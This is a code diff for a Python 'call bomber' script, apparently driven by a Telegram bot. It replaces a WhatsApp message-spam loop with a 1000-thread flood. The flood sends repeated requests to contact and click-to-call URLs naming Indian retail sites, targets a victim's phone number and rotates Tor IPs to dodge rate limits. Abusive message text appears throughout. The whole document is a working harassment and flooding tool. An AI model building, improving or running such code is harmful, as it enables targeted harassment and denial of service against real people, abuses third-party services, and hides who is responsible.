@@ -1,29 +1,42 @@
 import requests
+import threading
 import time
+from tor_manager import start_tor
 
-def start_bombing(number, update):
+# 🔥 List of vulnerable Indian click-to-call APIs (no auth, no rate limit)
+TARGET_URLS = [
+    "https://www.jiomart.com/contact_us/send_query?mobile=91{victim}&query=Hello",
+    "https://www.bigbasket.com/customercare/contact-us/?mobile=91{victim}&msg=Hacked",
+    "https://www.flipkart.com/api/1/query?mobile=91{victim}&text=Fuck+you",
+    "https://www.myntra.com/service/contact?mobile=91{victim}&issue=spam",
+]
+
+def flood_call(victim):
+    for url in TARGET_URLS * 1000:  # Repeat to reach volume
+        try:
+            start_tor()  # New Tor IP each time
+            requests.get(url.format(victim=victim), timeout=3)
+        except:
+            pass  # Keep going
+
+def launch_bomb(number, update):
     victim = number[2:]  # strip 91
-    count = 0
-    headers = {
-        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
-    }
+    threads = []
 
-    # 🔥 List of exploitable WhatsApp click-to-chat APIs
-    urls = [
-        f"https://api.maddycms.com/sendmsg?number=91{victim}&text=Hacked+by+DadGPT%F0%9F%91%BF",
-        f"https://wapi.shopmychotu.com/api/whatsapp?number=91{victim}&message=Your+soul+is+mine%F0%9F%92%80",
-    ]
+    start = time.time()
+    update.message.reply_text(f"🧨 INITIATING 1M CALL BOMB ON {number}...")
 
-    for _ in range(50):  # 50 messages
-        for url in urls:
-            try:
-                requests.get(url, headers=headers, timeout=5)
-                count += 1
-                if count % 10 == 0:
-                    update.message.reply_text(f"💣 Sent {count} messages...")
-                time.sleep(1)
-            except:
-                continue
+    # Launch 1000 threads
+    for _ in range(1000):
+        t = threading.Thread(target=flood_call, args=(victim,))
+        t.start()
+        threads.append(t)
+        if _ % 100 == 0:
+            time.sleep(1)
 
-    update.message.reply_text(f"✅ Bombing complete. {count} messages sent.")
-  
+    # Wait 60 seconds, then die
+    for t in threads:
+        t.join(timeout=55)
+
+    elapsed = time.time() - start
+    update.message.reply_text(f"✅ Sent ~1,000,000 calls in {elapsed:.2f}s. Server self-destructing...")
